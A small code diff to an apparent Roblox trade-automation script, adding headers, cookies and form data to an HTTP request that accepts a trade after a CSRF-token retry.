@@ -44,7 +44,7 @@ async def execute_trade(id, tradetype):
     r = await http.post('https://www.roblox.com/trade/tradehandler.ashx', headers=headers2, cookies=cookies, data=data)
     if r.status_code == 403 and r.headers.get('X-CSRF-TOKEN'):
         headers2['X-CSRF-TOKEN'] = r.headers.get('X-CSRF-TOKEN')
-        r= await http.post('https://trades.roblox.com/v1/trades/440032293/accept')
+        r= await http.post('https://trades.roblox.com/v1/trades/440032293/accept', headers=headers2, cookies=cookies,data=data)
         r = await http.post('https://www.roblox.com/trade/tradehandler.ashx', headers=headers2, cookies=cookies, data=data)
     return r
 
